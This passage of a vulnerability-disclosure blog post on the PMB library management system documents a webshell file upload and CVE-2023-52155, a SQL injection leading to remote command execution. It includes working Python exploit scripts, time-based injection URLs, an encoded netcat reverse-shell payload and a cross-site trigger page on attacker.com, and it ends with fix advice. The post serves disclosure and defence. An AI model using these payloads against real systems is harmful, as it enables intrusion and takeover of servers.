    r = requests.post(url, headers=headers, cookies=cookies, data=data)

def random_string(size=16, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='', description='File Upload in camera_upload.php (RCE)', epilog='Text at the bottom of help')
    parser.add_argument('pmb_url', type=str, help='PMB\'s URL (e.g. http://127.0.0.1/pmb or http://127.0.0.1)')
    parser.add_argument('--sessid', type=str, help='PhpMyBibli-SESSID',required=False)
    parser.add_argument('--sessid_list', nargs='+', help='PhpMyBibli-SESSID',required=False)
    parser.add_argument('--command', type=str, help='Execute custom command',required=False)
    parser.add_argument("--clean_webshell", help="Clean webshell after command execution", action="store_true")
    args = parser.parse_args()

    if not args.sessid:
        if not args.sessid_list:
            exit()

    sessid_list = []

    url = "{0}/".format(args.pmb_url)
    headers = {"Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
    filename = random_string()
    command = args.command

    if args.sessid:
        sessid_list.append(args.sessid)
    elif args.sessid_list:
        sessid_list = args.sessid_list

    for sessid in args.sessid_list:
        status = False
        cookies = {"PhpMyBibli-LOGIN": "admin", "PhpMyBibli-SESSID": sessid}

        if upload_webshell(url, cookies, headers, filename):
            status = True
            if command:
                print(execute_command(url, filename, command))
            if args.clean_webshell:
                clean_webshell(url, cookies, headers, filename)
        if status:
            break</code></pre><div><span style="font-family: Space Grotesk;">After executing it, by passing a list of session identifiers, the PHTML file is uploaded and the "id" command is executed.</span></div>
  <pre><code>root@ubuntu:/var/www/html/pocs# python3 File-Upload-7.4.6-camera_upload.py --sessid_list 1293437551 8679922718 3239147683 3324994107 --command "id" http://127.0.0.1/pmb/
 PNG

IHDRuid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><pre><br /></pre><h3><code><span style="font-family: Space Grotesk;">CVE-2023-52155: SQL Injection to RCE in /admin/sauvegarde/run.php</span></code></h3><div><code><span><br /></span></code></div><div><code><span style="font-family: Space Grotesk;">To conclude the vulnerability research, an attempt was made to find a more immediate way to achieve remote command execution. After reviewing several invocations of functions such as <b>&#8220;eval&#8221;</b> and <b>&#8220;exec&#8221;</b>, the possibility of obtaining a command injection through an authenticated SQL Injection was identified.</span></code></div>

<pre><code>/admin/sauvegarde/run.php
11&nbsp; require($base_path."/includes/init.inc.php");</code></pre><div><span style="font-family: Space Grotesk;">In the code snippet above, <b>"/includes/init.inc.php"</b> initializes the inclusion of multiple PHP files. An interesting file that was included is <b>"/pmb/includes/global_vars.inc.php"</b>, which seems to implement code to emulate PHP's deprecated register_globals by defining global variables based on GET parameters.</span></div>
  
<pre><code>/pmb/includes/global_vars.inc.php
170  foreach ($_GET as $__key__PMB =&gt; $val) {
171    if (!in_array($__key__PMB,$forbidden_overload)) {
172      $val = cp1252_normalize($val);
173      add_sl($val);
174      $GLOBALS[$__key__PMB] = $val;
175    }
176  }</code></pre><div><code><span style="font-family: Space Grotesk;">Following with the code review, on line 34 (referring to a code section of the <b>/admin/sauvegarde/run.php</b> file), the code sets the variable <b>$currentSauv</b> to the value of the first element in the <b>$sauvegardes</b> array.&nbsp;</span></code></div>
<pre><code>/admin/sauvegarde/run.php
34 $currentSauv=$sauvegardes[0];</code></pre><div><code><span style="font-family: Space Grotesk;">In the following code snippet, on line 45, a SQL query is formed by concatenating the variable <span><b>$currentSauv</b></span> directly into the query string.</span></code></div>

<pre><code>/admin/sauvegarde/run.php
45&nbsp; $requete = "select sauv_sauvegarde_nom, sauv_sauvegarde_file_prefix, sauv_sauvegarde_tables, sauv_sauvegarde_compress,sauv_sauvegarde_compress_command, sauv_sauvegarde_crypt from sauv_sauvegardes where sauv_sauvegarde_id=".$currentSauv;
46 &nbsp;$resultat = pmb_mysql_query($requete);
47 &nbsp;$res = pmb_mysql_fetch_object($resultat);</code></pre><div><code><span><span style="font-family: Space Grotesk;">Note that the SQL query is attacker-controlled, because it's possible to modify the&nbsp;<b>$sauvegardes</b>&nbsp;variable by sending an array via a GET parameter that is added to the PHP global variables.</span><br /><br /><div><code><span><span style="font-family: Space Grotesk;">To verify the existence of this vulnerability, a time-based SQL injection technique can be used.</span><br /></span></code></div>
    <pre><code>Sleep for 30 seconds:
http://host/pmb/admin/sauvegarde/run.php?sauvegardes[0]=99999%20or%20sleep(30)--%20-

Sleep for 5 seconds:
http://host/pmb/admin/sauvegarde/run.php?sauvegardes[0]=99999%20or%20sleep(5)--%20-</code></pre>
    <span style="font-family: Space Grotesk;"><br />Afterwards, in the following code section (lines 118-129), if compression is enabled (<span><b>$res-&gt;sauv_sauvegarde_compress</b></span> equals 1), the script executes the compression commands obtained from the result of the previously mentioned query.</span></span></code></div>

<pre><code>/admin/sauvegarde/run.php
118  if ($res-&gt;sauv_sauvegarde_compress==1) {
119    fwrite($fe,"#Compress commands : ".$res-&gt;sauv_sauvegarde_compress_command."\r\n");
120    $command=explode(":",$res-&gt;sauv_sauvegarde_compress_command);
121
122    switch ($command[0]) {
123      case 'external':
124        $c_command=str_replace("%s","../../admin/backup/backups/".$temp_file,$command[1]);
125        exec($c_command);
126        @unlink("../../admin/backup/backups/".$temp_file);
127        $temp_file="../../admin/backup/backups/".$temp_file.".".$command[3];
128        if (!file_exists($temp_file)) abort("Compression failed",$logid);
129          break;</code></pre><div><div><span style="font-family: Space Grotesk;">Since the SQL query is attacker-controlled, as previously stated, manipulation of the selected <b>sauv_sauvegarde_compress_command</b> column value can be achieved by using a UNION clause to execute an arbitrary external command (e.g., <b>external:ping example.com</b>).</span></div></div><div><code><span><br /></span></code></div><div><code><span><div style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjKcRZwz3MBkq6bWFmKBxeEOX9D8T8nK14EpxDHvobEcotai4GLgFk0lWjrKYNX4wOFRFqbIzGaRPnhLU9jH9A40vTjXM1Lxoc9N-O6M98ttt-nfHnFYSjVP0Wplh81OLylqtj-T0E5cjz_s1MkJX9HmkqLsNxODt2yK9RriMloZJSiJbnFPIO7Ob-q7YeX"><img alt="" height="96" src="https://blogger.googleusercontent.com/img/a/AVvXsEjKcRZwz3MBkq6bWFmKBxeEOX9D8T8nK14EpxDHvobEcotai4GLgFk0lWjrKYNX4wOFRFqbIzGaRPnhLU9jH9A40vTjXM1Lxoc9N-O6M98ttt-nfHnFYSjVP0Wplh81OLylqtj-T0E5cjz_s1MkJX9HmkqLsNxODt2yK9RriMloZJSiJbnFPIO7Ob-q7YeX=w610-h96" width="610" /></a></div><div style="text-align: center;"><span style="font-family: Space Grotesk;">Example of manipulated command</span></div><div><br /></div></span></code></div><div><code></code></div>
<span style="font-family: Space Grotesk;">The following payload injects a command to send a reverse shell to 127.0.0.1 on port 443.</span>
    <pre><code>http://host/pmb/admin/sauvegarde/run.php?sauvegardes[0]=9999%20or%201=1%20union%20select%201,1,1,1,GROUP_CONCAT(CHAR(101,120,116,101,114,110,97,108,58,114,109,32,45,102,32,47,116,109,112,47,102,59,109,107,102,105,102,111,32,47,116,109,112,47,102,59,99,97,116,32,47,116,109,112,47,102,124,47,98,105,110,47,115,104,32,45,105,32,50,62,38,49,124,110,99,32,49,50,55,46,48,46,48,46,49,32,52,52,51,32,62,47,116,109,112,47,102)),1%20LIMIT%201,1</code></pre><div><code></code></div>
  
    <span style="font-family: Space Grotesk;">Additionally, this vulnerability can be triggered when an authenticated user accesses a cross-site page (e.g. attacker.com/poc.html) that includes, for example, the following JavaScript code.</span>
    <pre><code>&lt;html&gt;
&lt;body&gt;Cross-site trigger POC&lt;/body&gt;
&lt;script&gt;
document.location = 'http://&lt;host&gt;/pmb/admin/sauvegarde/run.php?sauvegardes[0]=9999%20or%201=1%20union%20select%201,1,1,1,GROUP_CONCAT(CHAR(101,120,116,101,114,110,97,108,58,114,109,32,45,102,32,47,116,109,112,47,102,59,109,107,102,105,102,111,32,47,116,109,112,47,102,59,99,97,116,32,47,116,109,112,47,102,124,47,98,105,110,47,115,104,32,45,105,32,50,62,38,49,124,110,99,32,49,50,55,46,48,46,48,46,49,32,52,52,51,32,62,47,116,109,112,47,102)),1%20LIMIT%201,1';
&lt;/script&gt;
&lt;/html&gt;</code></pre><div><code><span style="font-family: Space Grotesk;">Finally, to automate the exploitation of the SQL Injection to RCE, the following proof of concept was developed, which iterates over a list of session identifiers trying to inject a specific OS command.</span></code></div>
</div></div></code></div>
</div></div></span></div>
<pre><code>#!/usr/bin/env python3
import warnings
warnings.filterwarnings("ignore")
import requests
import sys
import re
import random
import argparse

def exploit(payload, cookies):
    for i in range(1,8):
        columns = "1," * i
        url = "{0}/admin/sauvegarde/run.php?sauvegardes[0]=9999%20OR%201=1%20UNION%20SELECT%20{1},{2},1%20LIMIT%201,1".format(args.pmb_url, columns[:-1], payload)
        print(url)
        print("\n")
        headers = {"Connection": "close"}
        r = requests.get(url, cookies=cookies, headers=headers)

def generate_payload(command):
    command = "external:{0}".format(command)
    ascii_points = [ord(char) for char in command]
    char_points = ','.join(str(point) for point in ascii_points)
    payload = f"GROUP_CONCAT(CHAR({char_points}))"
    return payload


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='', description='SQL Injection to RCE in run.php', epilog='Text at the bottom of help')
    parser.add_argument('pmb_url', type=str, help='PMB\'s URL (e.g. http://127.0.0.1/pmb or http://127.0.0.1)')
    parser.add_argument('--sessid', type=str, help='PhpMyBibli-SESSID',required=False)
    parser.add_argument('--sessid_list', nargs='+', help='PhpMyBibli-SESSID',required=False)
    parser.add_argument('--command', type=str, help='Execute custom command',required=False)
    args = parser.parse_args()

    if not args.sessid:
        if not args.sessid_list:
            exit()
    
    sessid_list = []
    
    if args.sessid:
        sessid_list.append(args.sessid)
    elif args.sessid_list:
        sessid_list = args.sessid_list

    for sessid in sessid_list:
        cookies = {"PhpMyBibli-LOGIN": "admin", "PhpMyBibli-SESSID": sessid}
        payload = generate_payload(args.command)
        exploit(payload, cookies)</code></pre><div><code><span style="font-family: Space Grotesk;">After running the proof of concept with a command to receive a reverse shell, it is received on port 443 as shown below.</span></code></div><div><code><span><br /></span></code></div><div><code><span><div><div style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEhpYwoivarFG-6UE93RLmvLfak_-VGYJY2UkOEJAtAdP7_6_YrmT4ALP_OGl9dzoXSbmP4idj3iSRu5OWM1DF_LgybFACkLOWgdwslCKgulSn43mmAr2LCJWM8h_vClaDpwy0TXFYZWEfTjZdPMIVbr7QcPcHSTnfLswrM9DZi8-A-OfZwxTof9UiyY4mcy"><img alt="" height="234" src="https://blogger.googleusercontent.com/img/a/AVvXsEhpYwoivarFG-6UE93RLmvLfak_-VGYJY2UkOEJAtAdP7_6_YrmT4ALP_OGl9dzoXSbmP4idj3iSRu5OWM1DF_LgybFACkLOWgdwslCKgulSn43mmAr2LCJWM8h_vClaDpwy0TXFYZWEfTjZdPMIVbr7QcPcHSTnfLswrM9DZi8-A-OfZwxTof9UiyY4mcy=w656-h234" width="656" /></a></div></div><div style="text-align: center;"><span style="font-family: Space Grotesk;">Receiving a reverse shell</span></div><div><br /></div><span></span><div><br /></div><h1><span style="font-family: Space Grotesk;">Fix</span></h1><span style="font-family: Space Grotesk;"><div><code><span><span style="font-family: Space Grotesk;"><br /></span></span></code></div>The vulnerabilities were reported to PMB Services, which implemented measures to correct them, so it is recommended to upgrade to the latest version of PMB available&nbsp;</span></span></code><span style="font-family: Space Grotesk;"><span>(7.5.4 at the time of writing the blog)</span><span>&nbsp;at </span><a href="https://forge.sigb.net/projects/pmb/files">https://forge.sigb.net/projects/pmb/files</a><span>.</span></span></div><div><code><span><div><br /></div><span></span><h1><span style="font-family: Space Grotesk;">Conclusion</span></h1><div><br /></div><div><span style="font-family: Space Grotesk;">The findings of this research highlight the importance of reviewing third-party library code that one relies upon to avoid potential security risks. The identification of insecure code development patterns &#8212;such as insecure SQL queries, improper file upload validations and improper argument escapes for operating system command execution&#8212; could indicate the presence of significant vulnerabilities. Because of this, it is crucial that developers adopt secure coding practices, considering security as they develop software.</span><br /><br /><br /></div></span></code></div>



<link rel="stylesheet"></link>


<link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css" rel="stylesheet"></link>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>

<!--and it's easy to individually load additional languages-->
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/go.min.js"></script>

<script>hljs.highlightAll();</script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16459303328">
</script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-16459303328');
</script>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
By
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<meta content='https://www.blogger.com/profile/00478835420477235790' itemprop='url'/>
<a class='g-profile' href='https://www.blogger.com/profile/00478835420477235790' rel='author' title='author profile'>
<span itemprop='name'>Valentino Massaro</span>
</a>
</span>
</span>
<span class='post-timestamp'>
at
<meta content='https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html' itemprop='url'/>
<a class='timestamp-link' href='https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2024-02-09T06:17:00-08:00'>February 09, 2024</abbr></a>
</span>
<span class='post-comment-link'>
</span>
<span class='post-icons'>
</span>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8777491027349637723&postID=554876999792156651&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8777491027349637723&postID=554876999792156651&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8777491027349637723&postID=554876999792156651&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8777491027349637723&postID=554876999792156651&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8777491027349637723&postID=554876999792156651&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
</div>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
Labels:
<a href='https://nexacybersecurity.blogspot.com/search/label/pmb' rel='tag'>pmb</a>,
<a href='https://nexacybersecurity.blogspot.com/search/label/rce' rel='tag'>rce</a>,
<a href='https://nexacybersecurity.blogspot.com/search/label/sql%20injection' rel='tag'>sql injection</a>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='comments' id='comments'>
<a name='comments'></a>
<h4>No comments:</h4>
<div id='Blog1_comments-block-wrapper'>
<dl class='avatar-comment-indent' id='comments-block'>
</dl>
</div>
<p class='comment-footer'>
<div class='comment-form'>
<a name='comment-form'></a>
<h4 id='comment-post-message'>Post a Comment</h4>
<p>
</p>
<a href='https://www.blogger.com/comment/frame/8777491027349637723?po=554876999792156651&hl=en' id='comment-editor-src'></a>
<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410px' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
<script src='https://www.blogger.com/static/v1/jsbin/2315299244-comment_from_post_iframe.js' type='text/javascript'></script>
<script type='text/javascript'>
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
</p>
</div>
</div>

        </div></div>
      
</div>
<div class='blog-pager' id='blog-pager'>
<a class='home-link' href='https://nexacybersecurity.blogspot.com/'>Home</a>
</div>
<div class='clear'></div>
<div class='post-feeds'>
<div class='feed-links'>
Subscribe to:
<a class='feed-link' href='https://nexacybersecurity.blogspot.com/feeds/554876999792156651/comments/default' target='_blank' type='application/atom+xml'>Post Comments (Atom)</a>
</div>
</div>
</div></div>
</div>
</div>
<div class='column-left-outer'>
<div class='column-left-inner'>
<aside>
</aside>
</div>
</div>
<div class='column-right-outer'>
<div class='column-right-inner'>
<aside>
<div class='sidebar section' id='sidebar-right-1'><div class='widget Profile' data-version='1' id='Profile1'>
<h2>About</h2>
<div class='widget-content'>
<dl class='profile-datablock'>
<dt class='profile-data'>
<a class='profile-name-link g-profile' href='https://www.blogger.com/profile/01560253899863415270' rel='author' style='background-image: url(//www.blogger.com/img/logo-16.png);'>
Juan Pablo Martnez
</a>
</dt>
</dl>
<a class='profile-link' href='https://www.blogger.com/profile/01560253899863415270' rel='author'>View my complete profile</a>
<div class='clear'></div>
</div>
</div><div class='widget BlogSearch' data-version='1' id='BlogSearch1'>
<h2 class='title'>Search This Blog</h2>
<div class='widget-content'>
<div id='BlogSearch1_form'>
<form action='https://nexacybersecurity.blogspot.com/search' class='gsc-search-box' target='_top'>
<table cellpadding='0' cellspacing='0' class='gsc-search-box'>
<tbody>
<tr>
<td class='gsc-input'>
<input autocomplete='off' class='gsc-input' name='q' size='10' title='search' type='text' value=''/>
</td>
<td class='gsc-search-button'>
<input class='gsc-search-button' title='search' type='submit' value='Search'/>
</td>
</tr>
</tbody>
</table>
</form>
</div>
</div>
<div class='clear'></div>
</div><div class='widget BlogArchive' data-version='1' id='BlogArchive2'>
<h2>Blog Archive</h2>
<div class='widget-content'>
<div id='ArchiveList'>
<div id='BlogArchive2_ArchiveList'>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://nexacybersecurity.blogspot.com/2024/'>
2024
</a>
<span class='post-count' dir='ltr'>(1)</span>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://nexacybersecurity.blogspot.com/2024/02/'>
February
</a>
<span class='post-count' dir='ltr'>(1)</span>
<ul class='posts'>
<li><a href='https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html'>A Journey Into Finding Vulnerabilities in the PMB ...</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class='clear'></div>
</div>
</div></div>
<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
<tbody>
<tr>
<td class='first columns-cell'>
<div class='sidebar section' id='sidebar-right-2-1'><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
<h2>Blog Archive</h2>
<div class='widget-content'>
<div id='ArchiveList'>
<div id='BlogArchive1_ArchiveList'>
<ul class='flat'>
<li class='archivedate'>
<a href='https://nexacybersecurity.blogspot.com/2024/02/'>February 2024</a> (1)
      </li>
</ul>
</div>
</div>
<div class='clear'></div>
</div>
</div></div>
</td>
<td class='columns-cell'>
<div class='sidebar section' id='sidebar-right-2-2'><div class='widget Label' data-version='1' id='Label1'>
<h2>Labels</h2>
<div class='widget-content list-label-widget-content'>
<ul>
<li>
<a dir='ltr' href='https://nexacybersecurity.blogspot.com/search/label/pmb'>pmb</a>
</li>
<li>
<a dir='ltr' href='https://nexacybersecurity.blogspot.com/search/label/rce'>rce</a>
</li>
<li>
<a dir='ltr' href='https://nexacybersecurity.blogspot.com/search/label/sql%20injection'>sql injection</a>
</li>
</ul>
<div class='clear'></div>
</div>
</div></div>
</td>
</tr>
</tbody>
</table>
<div class='sidebar section' id='sidebar-right-3'><div class='widget PageList' data-version='1' id='PageList1'>
<div class='widget-content'>
<ul>
<li>
<a href='https://nexacybersecurity.blogspot.com/'>Home</a>
</li>
</ul>
<div class='clear'></div>
</div>
</div></div>
</aside>
</div>
</div>
</div>
<div style='clear: both'></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class='main-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<footer>
<div class='footer-outer'>
<div class='footer-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left footer-fauxborder-left'>
<div class='fauxborder-right footer-fauxborder-right'></div>
<div class='region-inner footer-inner'>
<div class='foot no-items section' id='footer-1'></div>
<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
<tbody>
<tr>
<td class='first columns-cell'>
<div class='foot no-items section' id='footer-2-1'></div>
</td>
<td class='columns-cell'>
<div class='foot no-items section' id='footer-2-2'></div>
</td>
</tr>
</tbody>
</table>
<!-- outside of the include in order to lock Attribution widget -->
<div class='foot section' id='footer-3' name='Footer'><div class='widget Attribution' data-version='1' id='Attribution1'>
<div class='widget-content' style='text-align: center;'>
Powered by <a href='https://www.blogger.com' target='_blank'>Blogger</a>.
</div>
<div class='clear'></div>
</div></div>
</div>
</div>
<div class='footer-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class='content-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<script type='text/javascript'>
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>
<!--It is your responsibility to notify your visitors about cookies used and data collected on your blog. Blogger makes a standard notification available for you to use on your blog, and you can customise it or replace it with your own notice. See http://www.blogger.com/go/cookiechoices for more details.-->
<script defer='' src='/js/cookienotice.js'></script>
<script>
    document.addEventListener('DOMContentLoaded', function(event) {
      window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
          (window.cookieOptions && cookieOptions.msg) || 'This site uses cookies from Google to deliver its services and to analyse traffic. Your IP address and user agent are shared with Google, together with performance and security metrics, to ensure quality of service, generate usage statistics and to detect and address abuse.',
          (window.cookieOptions && cookieOptions.close) || 'Got it',
          (window.cookieOptions && cookieOptions.learn) || 'Learn more',
          (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
    });
  </script>

<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/91768132-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY45UMwaPi3G_Y49pQhKoH0JKwJISA:1736599021427';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d8777491027349637723','//nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html','8777491027349637723');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '8777491027349637723', 'title': 'Nexa \u2014 Cybersecurity research', 'url': 'https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html', 'canonicalUrl': 'https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html', 'homepageUrl': 'https://nexacybersecurity.blogspot.com/', 'searchUrl': 'https://nexacybersecurity.blogspot.com/search', 'canonicalHomepageUrl': 'https://nexacybersecurity.blogspot.com/', 'blogspotFaviconUrl': 'https://nexacybersecurity.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Nexa \u2014 Cybersecurity research - Atom\x22 href\x3d\x22https://nexacybersecurity.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Nexa \u2014 Cybersecurity research - RSS\x22 href\x3d\x22https://nexacybersecurity.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Nexa \u2014 Cybersecurity research - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/8777491027349637723/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Nexa \u2014 Cybersecurity research - Atom\x22 href\x3d\x22https://nexacybersecurity.blogspot.com/feeds/554876999792156651/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/d2c988fc3a56b1b1', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '554876999792156651', 'postImageThumbnailUrl': 'https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a\x3ds72-w640-c-h118', 'postImageUrl': 'https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a\x3dw640-h118', 'pageName': 'A Journey Into Finding Vulnerabilities in the PMB Library Management System', 'pageTitle': 'Nexa \u2014 Cybersecurity research: A Journey Into Finding Vulnerabilities in the PMB Library Management System', 'metaDescription': 'Finding vulnerabilities in the PMB Library Management System with technical details of multiple SQL Injections that lead to remote code execution.'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'A Journey Into Finding Vulnerabilities in the PMB Library Management System', 'description': 'Finding vulnerabilities in the PMB Library Management System with technical details of multiple SQL Injections that lead to remote code execution.', 'featuredImage': 'https://blogger.googleusercontent.com/img/a/AVvXsEgRq8H5q_GugFUJBopwVAWs-kfZ50qKQYC86xZrrppuSDq3237JBeam3IKRaYF_IBPCCFYT_c3Yrri33XJ16gk0P7INPKfFCmjHRYN0BVyVSUCGPXrhydSi-KOj0RS519sgyNBG7TbWCOS6SNuZIlryrNxrrfsQWfx3hyD_wohAHl00RTJllSQYsDLdOx1a\x3dw640-h118', 'url': 'https://nexacybersecurity.blogspot.com/2024/02/journey-finding-vulnerabilities-in-pmb-library-management-system.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 554876999792156651}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
